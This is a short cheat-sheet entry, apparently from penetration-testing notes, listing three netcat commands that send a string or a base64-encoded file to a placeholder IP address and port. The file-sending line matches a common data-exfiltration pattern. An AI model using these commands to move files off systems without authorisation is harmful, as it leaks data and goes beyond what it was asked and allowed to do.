# Send file
```shell-session
$ nc -nv <IP> <PORT> < <(echo 'string')
$ echo 'string' | nc -nv <IP> <PORT>
$ base64 -w0 <file> | nc -nv <IP> <PORT>
```
